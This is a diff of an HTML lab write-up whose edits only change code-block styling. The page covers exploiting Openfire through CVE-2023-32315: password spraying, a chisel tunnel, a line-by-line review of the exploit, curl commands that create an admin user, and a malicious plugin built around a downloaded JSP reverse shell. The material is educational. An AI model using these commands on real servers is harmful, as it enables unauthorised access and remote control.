 <h3 id="discovering-openfire-s-password-due-to-password-re-use-dot">Discovering OpenFire&rsquo;s password due to password re-use.</h3>
 <p>Now that the 10 minute lockout time is up we can password spray with netexec, and we see we get a hit for the user <code>OpenFire</code> with our newly found passwords, it turns out Alexander has been naughty and is re-using their password.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>netexec smb $box -u Users.txt -p Passwords.txt --continue-on-success | grep <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>netexec smb $box -u Users.txt -p Passwords.txt --continue-on-success | grep <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span>
 </span></span></code></pre></div><ul>
 <li><figure><img src="/ox-hugo/2025-04-18-171858_.png">
 </figure>
@@ -1367,7 +1367,7 @@ We are going to use a super simple base64 encoded powershell reverse shell avail
 </li>
 </ul>
 <p>Running <code>netstat</code> we can see that it does appear to be running locally.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>netstat -ano
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>netstat -ano
 </span></span></code></pre></div><ul>
 <li><figure><img src="/ox-hugo/2025-04-18-182410_.png">
 </figure>
@@ -1386,15 +1386,15 @@ We are going to use a super simple base64 encoded powershell reverse shell avail
 <ol>
 <li>
 <p>Transfer the binary to the target</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>wget http<span style="color:#960050;background-color:#1e0010">:</span>//<span style="color:#ae81ff">10.10</span>.14.<span style="color:#ae81ff">20</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">9000</span>/chisel.exe -o chisel.exe
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>wget http<span style="color:#960050;background-color:#1e0010">:</span>//<span style="color:#ae81ff">10.10</span>.14.<span style="color:#ae81ff">20</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">9000</span>/chisel.exe -o chisel.exe
 </span></span></code></pre></div></li>
 <li>
 <p>Start a listener on kali:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>./chisel server -p <span style="color:#ae81ff">8989</span> --reverse
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>./chisel server -p <span style="color:#ae81ff">8989</span> --reverse
 </span></span></code></pre></div></li>
 <li>
 <p>Connect back to our listener on kali and redirect traffic from port <code>9090</code> on the target to port <code>8000</code> on our attack machine.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>.<span style="color:#ae81ff">\c</span>hisel.exe client 10.10.14.20:8989 R:8000:127.0.0.1:9090
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>.<span style="color:#ae81ff">\c</span>hisel.exe client 10.10.14.20:8989 R:8000:127.0.0.1:9090
 </span></span></code></pre></div><ul>
 <li><figure><img src="/ox-hugo/2025-04-18-185924_.png">
 </figure>
@@ -1422,13 +1422,13 @@ We are going to use a super simple base64 encoded powershell reverse shell avail
 </li>
 </ul>
 <p>We can download the exploit easily</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>wget https://raw.githubusercontent.com/K3ysTr0K3R/CVE-2023-32315-EXPLOIT/refs/heads/main/CVE-2023-32315.py
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>wget https://raw.githubusercontent.com/K3ysTr0K3R/CVE-2023-32315-EXPLOIT/refs/heads/main/CVE-2023-32315.py
 </span></span></code></pre></div><h4 id="code-review-for-cve-2023-32315-exploit">Code Review for CVE-2023-32315 exploit:</h4>
 <p>Again I find this incredibly beneficial as a means to actually understand the underlying the mechanism that is being exploited so that it deepens our understanding. If you are already familiar with this exploit and the underlying mechanism I would skip this part, but if you are not there is a lot to learn here + you can learn a lil&rsquo; bit of python too.</p>
 <p>The exploit itself is only 110 lines long and a large part of this is used to for presentation and basic functionality purpose e.g. making it look nice and calling main functions etc so we can ignore those parts and focus on the actual exploitation parts.</p>
 <h5 id="library-imports">Library Imports:</h5>
 <p>Here we have the imports for libraries.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> argparse
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> argparse
 </span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> subprocess
 </span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> requests
 </span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> rich.console <span style="color:#f92672">import</span> Console
@@ -1437,7 +1437,7 @@ We are going to use a super simple base64 encoded powershell reverse shell avail
 </ul>
 <h5 id="get-csrf-token-function"><code>get_csrf_token</code> function:</h5>
 <p>This function is used to extract the <code>csrf</code> token.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">get_csrf_token</span>(target_url):
 </span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">try</span>:
 </span></span><span style="display:flex;"><span>        response <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>head(target_url <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;/login.jsp&#34;</span>)
@@ -1452,14 +1452,14 @@ We are going to use a super simple base64 encoded powershell reverse shell avail
 <p>The dictionary is then checked for the key <code>csrf</code> and then returns that value in the <code>csrf_token</code> variable.</p>
 <p>If it receives a request exception then it returns the response <code>None</code> instead.</p>
 <p>As you can see this is just a HEAD request that could be performed in a browser or via cli like so.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e">#Command</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e">#Command</span>
 </span></span><span style="display:flex;"><span>curl -I http://<span style="color:#f92672">[</span>targetURL<span style="color:#f92672">]</span>/login.jsp | grep -e <span style="color:#e6db74">&#39;csrf&#39;</span>
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#75715e">#Example</span>
 </span></span><span style="display:flex;"><span>curl -I http://127.0.0.1:8000/login.jsp | grep -e <span style="color:#e6db74">&#39;csrf&#39;</span>
 </span></span></code></pre></div><h5 id="add-credentials-function"><code>add_credentials</code> function:</h5>
 <p>This is where the exploitation logic is declared.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">add_credentials</span>(target_url, csrf_token, username, password):
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">add_credentials</span>(target_url, csrf_token, username, password):
 </span></span><span style="display:flex;"><span>    color<span style="color:#f92672">.</span>print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;[blue][*][/blue] Launching exploit against: [yellow]</span><span style="color:#e6db74">{</span>target_url<span style="color:#e6db74">}</span><span style="color:#e6db74">[/yellow]&#34;</span>)
 </span></span></code></pre></div><p>The function takes four arguments, <code>target_url</code>, <code>csrf_token</code>, <code>username</code>, and <code>password</code>. We&rsquo;ve already seen the <code>target_url</code> and <code>csrf_token</code> in previous steps, so the only new inputs here are <code>username</code> and <code>password</code>, used to create a new user.</p>
 <p>First, it prints a message indicating that it&rsquo;s launching the exploit against the specified <code>target_url</code>.</p>
@@ -1467,7 +1467,7 @@ We are going to use a super simple base64 encoded powershell reverse shell avail
 <li>
 <p>Constructing vulnerable paths &amp; headers:</p>
 <p>Next, it constructs a hard-coded vulnerable path called <code>vuln_path</code> &amp; declares the <code>Headers</code></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>    vuln_path <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;/setup/setup-s/%u002e%u002e/%u002e%u002e/user-create.jsp?csrf=</span><span style="color:#e6db74">{</span>csrf_token<span style="color:#e6db74">}</span><span style="color:#e6db74">&amp;username=</span><span style="color:#e6db74">{</span>username<span style="color:#e6db74">}</span><span style="color:#e6db74">&amp;password=</span><span style="color:#e6db74">{</span>password<span style="color:#e6db74">}</span><span style="color:#e6db74">&amp;passwordConfirm=</span><span style="color:#e6db74">{</span>password<span style="color:#e6db74">}</span><span style="color:#e6db74">&amp;isadmin=on&amp;create=Create%2bUser&#39;</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>    vuln_path <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;/setup/setup-s/%u002e%u002e/%u002e%u002e/user-create.jsp?csrf=</span><span style="color:#e6db74">{</span>csrf_token<span style="color:#e6db74">}</span><span style="color:#e6db74">&amp;username=</span><span style="color:#e6db74">{</span>username<span style="color:#e6db74">}</span><span style="color:#e6db74">&amp;password=</span><span style="color:#e6db74">{</span>password<span style="color:#e6db74">}</span><span style="color:#e6db74">&amp;passwordConfirm=</span><span style="color:#e6db74">{</span>password<span style="color:#e6db74">}</span><span style="color:#e6db74">&amp;isadmin=on&amp;create=Create%2bUser&#39;</span>
 </span></span><span style="display:flex;"><span>    headers <span style="color:#f92672">=</span> {
 </span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;Accept-Encoding&#34;</span>: <span style="color:#e6db74">&#34;gzip, deflate&#34;</span>,
 </span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;Accept&#34;</span>: <span style="color:#e6db74">&#34;*/*&#34;</span>,
@@ -1494,7 +1494,7 @@ We are going to use a super simple base64 encoded powershell reverse shell avail
 <li>
 <p><code>check_vuln</code>:</p>
 <p>The following logic is used to check if the target is valid, perform the exploit &amp; then verify if the exploit has been successful.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>    check_vuln <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>get(target_url, headers<span style="color:#f92672">=</span>headers, verify<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>)<span style="color:#f92672">.</span>status_code
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>    check_vuln <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>get(target_url, headers<span style="color:#f92672">=</span>headers, verify<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>)<span style="color:#f92672">.</span>status_code
 </span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> check_vuln <span style="color:#f92672">==</span> <span style="color:#ae81ff">200</span>:
 </span></span><span style="display:flex;"><span>        color<span style="color:#f92672">.</span>print(<span style="color:#e6db74">&#34;[green][+][/green] Target is vulnerable&#34;</span>)
 </span></span><span style="display:flex;"><span>        color<span style="color:#f92672">.</span>print(<span style="color:#e6db74">&#34;[blue][*][/blue] Adding credentials&#34;</span>)
@@ -1506,7 +1506,7 @@ We are going to use a super simple base64 encoded powershell reverse shell avail
 <li>
 <p><code>add_credentials_cmd</code>:</p>
 <p>This logic is for adding the credentials to the target.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>        add_credentials_cmd <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;curl -I -X GET &#39;</span><span style="color:#e6db74">{</span>target_url<span style="color:#e6db74">}{</span>vuln_path<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39; &#34;</span> \
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>        add_credentials_cmd <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;curl -I -X GET &#39;</span><span style="color:#e6db74">{</span>target_url<span style="color:#e6db74">}{</span>vuln_path<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39; &#34;</span> \
 </span></span><span style="display:flex;"><span>                <span style="color:#e6db74">&#34;-H &#39;Accept-Encoding: gzip, deflate&#39; &#34;</span> \
 </span></span><span style="display:flex;"><span>                <span style="color:#e6db74">&#34;-H &#39;Accept: */*&#39; &#34;</span> \
 </span></span><span style="display:flex;"><span>                <span style="color:#e6db74">&#34;-H &#39;Accept-Language: en-US;q=0.9,en;q=0.8&#39; &#34;</span> \
@@ -1529,7 +1529,7 @@ We are going to use a super simple base64 encoded powershell reverse shell avail
 <li>
 <p>process the cmd command:</p>
 <p>This logic is used for actually sending the malicious request via the subprocess library.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>        process <span style="color:#f92672">=</span> subprocess<span style="color:#f92672">.</span>Popen(add_credentials_cmd, shell<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>, stdout<span style="color:#f92672">=</span>subprocess<span style="color:#f92672">.</span>PIPE, stderr<span style="color:#f92672">=</span>subprocess<span style="color:#f92672">.</span>PIPE)
 </span></span><span style="display:flex;"><span>        output, error <span style="color:#f92672">=</span> process<span style="color:#f92672">.</span>communicate()
 </span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#34;200&#34;</span> <span style="color:#f92672">in</span> str(output):
@@ -1545,7 +1545,7 @@ We are going to use a super simple base64 encoded powershell reverse shell avail
 </ul>
 <h5 id="exploit-function"><code>exploit</code> function:</h5>
 <p>This is, as you have probably guessed where the exploit logic is executed.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">exploit</span>(target_url):
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">exploit</span>(target_url):
 </span></span><span style="display:flex;"><span>    username <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;hugme&#34;</span>
 </span></span><span style="display:flex;"><span>    password <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;HugmeNOW&#34;</span>
 </span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">try</span>:
@@ -1562,7 +1562,7 @@ We are going to use a super simple base64 encoded powershell reverse shell avail
 <p>Any <code>requests.RequestException</code> errors are caught and ignored <code>pass</code>.</p>
 <h3 id="side-quest-recreating-the-exploit-just-using-curl">Side-Quest Recreating the exploit just using <code>curl</code>:</h3>
 <p>This is just to show how simple this exploit is. I like doing side-quests like these to further cement the learning, if you want you can just use the downloaded exploit. But as you&rsquo;ll see it&rsquo;s possible to just recreate this exploit on the command line as it&rsquo;s just two <code>curl</code> commands. The first to retrieve the <code>csrf</code> token and the second to create the user.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span><span style="color:#75715e"># Set our target url.</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span><span style="color:#75715e"># Set our target url.</span>
 </span></span><span style="display:flex;"><span>target_url<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;http://127.0.0.1:8000&#34;</span>
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#75715e">#Url Encode our Username &amp; Password as these are sent via url</span>
@@ -1615,7 +1615,7 @@ We are going to use a super simple base64 encoded powershell reverse shell avail
 </ul>
 <h3 id="creating-a-malicious-reverse-shell-plugin-for-openfire">Creating a malicious reverse shell plugin for OpenFire:</h3>
 <p>After some searching online we can find a public java reverse shell</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>wget https://raw.githubusercontent.com/LaiKash/JSP-Reverse-and-Web-Shell/refs/heads/main/shell.jsp
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>wget https://raw.githubusercontent.com/LaiKash/JSP-Reverse-and-Web-Shell/refs/heads/main/shell.jsp
 </span></span></code></pre></div><ul>
 <li><a href="https://gist.github.com/caseydunham/53eb8503efad39b83633961f12441af0"  target="_blank" rel="noreferrer nofollow">https://gist.github.com/caseydunham/53eb8503efad39b83633961f12441af0</a>
 </li>
@@ -1627,13 +1627,13 @@ We are going to use a super simple base64 encoded powershell reverse shell avail
 </li>
 </ul>
 <p>Next we download the example plugin repo from OpenFire.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>git clone https://github.com/igniterealtime/openfire-exampleplugin.git
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>git clone https://github.com/igniterealtime/openfire-exampleplugin.git
 </span></span></code></pre></div><p>We copy the <code>shell.jsp</code> to <code>exampleplugin-page.jsp</code> location for compilation</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>cp ../shell.jsp ./src/main/web/exampleplugin-page.jsp
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>cp ../shell.jsp ./src/main/web/exampleplugin-page.jsp
 </span></span></code></pre></div><p>We will need to install apache maven to compile this exploit, so if you don&rsquo;t have it already run the below to install it.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>sudo apt update <span style="color:#f92672">&amp;&amp;</span> sudo apt install maven -y
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>sudo apt update <span style="color:#f92672">&amp;&amp;</span> sudo apt install maven -y
 </span></span></code></pre></div><p>Now we need to create the package.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>mvn -B package
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>mvn -B package
 </span></span></code></pre></div><p>Once complete you should get a successful build message:</p>
 <ul>
 <li><figure><img src="/ox-hugo/2025-04-21-105138_.png">
@@ -1645,10 +1645,10 @@ We are going to use a super simple base64 encoded powershell reverse shell avail
 </li>
 </ul>
 <p>Next we put the plugin into the correct structure for uploading to OpenFire.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>cp ./target/exampleplugin.jar exampleplugin.zip; zip -ur exampleplugin.zip ./plugin.xml ./readme.html; mv exampleplugin.zip ./target/exampleplugin.jar;
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>cp ./target/exampleplugin.jar exampleplugin.zip; zip -ur exampleplugin.zip ./plugin.xml ./readme.html; mv exampleplugin.zip ./target/exampleplugin.jar;
 </span></span></code></pre></div><p>The correct file is <code>exampleplugin.jar</code> located in <code>target/</code></p>
 <p>Start a listener:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>rlwrap -cAr nc -nvlp <span style="color:#ae81ff">6969</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>rlwrap -cAr nc -nvlp <span style="color:#ae81ff">6969</span>
 </span></span></code></pre></div><p>Next we upload the exploit</p>
 <ul>
 <li><figure><img src="/ox-hugo/2025-04-21-110351_.png">
@@ -1656,7 +1656,7 @@ We are going to use a super simple base64 encoded powershell reverse shell avail
 </li>
 </ul>
 <p>Now we finally trigger the plugin so our reverse shell is active.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>curl -v <span style="color:#e6db74">&#34;http://127.0.0.1:8000/setup/setup-s/%u002e%u002e/%u002e%u002e/plugins/exampleplugin/exampleplugin-page.jsp?&#34;</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>curl -v <span style="color:#e6db74">&#34;http://127.0.0.1:8000/setup/setup-s/%u002e%u002e/%u002e%u002e/plugins/exampleplugin/exampleplugin-page.jsp?&#34;</span>
 </span></span></code></pre></div><p>Again an exception will be thrown but we have our reverse shell.</p>
 <ul>
 <li><figure><img src="/ox-hugo/2025-04-21-110211_.png">
@@ -1668,7 +1668,7 @@ We are going to use a super simple base64 encoded powershell reverse shell avail
 <p>If you just want to get to the good stuff you can jump straight to <code>openfire DB</code> part, however I left this all in as a means to show it&rsquo;s not as simple &ldquo;you just do x then y then you&rsquo;re root&rdquo; there is more to it.</p>
 <h4 id="check-for-default-creds">Check for default creds:</h4>
 <p>I run to check for stored credentials however we only get default credentials.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cmd" data-lang="cmd"><span style="display:flex;"><span>cmdkey /list
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-cmd" data-lang="cmd"><span style="display:flex;"><span>cmdkey /list
 </span></span></code></pre></div><ul>
 <li><figure><img src="/ox-hugo/2025-04-21-135915_.png">
 </figure>
@@ -1689,7 +1689,7 @@ We are going to use a super simple base64 encoded powershell reverse shell avail
 <p>The entry doesn’t usually correspond to an actual service or account we can use in any obvious way. It&rsquo;s often just tied to Windows features that sync settings or provide background services.</p>
 <h4 id="enumerating-users-groups-and-privs">Enumerating Users/Groups &amp; privs:</h4>
 <p>Next lets enumerate users groups &amp; privileges.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>whoami /priv /groups; query user; net user
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>whoami /priv /groups; query user; net user
 </span></span></code></pre></div><ul>
 <li><figure><img src="/ox-hugo/2025-04-21-140908_.png">
 </figure>
@@ -1697,11 +1697,11 @@ We are going to use a super simple base64 encoded powershell reverse shell avail
 </ul>
 <p>We can see we are a service account and we have limited privileges.</p>
 <p>Lets check if any other users are part of interesting groups.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>whoami /groups; net localgroup <span style="color:#e6db74">&#34;Remote Desktop Users&#34;</span>; net localgroup <span style="color:#e6db74">&#34;Administrators&#34;</span>; net localgroup <span style="color:#e6db74">&#34;DNS Admins&#34;</span>; net localgroup <span style="color:#e6db74">&#34;Backup Operators&#34;</span>; net localgroup <span style="color:#e6db74">&#34;Print Operators&#34;</span>; net localgroup <span style="color:#e6db74">&#34;Server Operators&#34;</span>;  net localgroup <span style="color:#e6db74">&#34;Event Log Readers&#34;</span>; net localgroup <span style="color:#e6db74">&#34;Hyper-V Administrators&#34;</span>
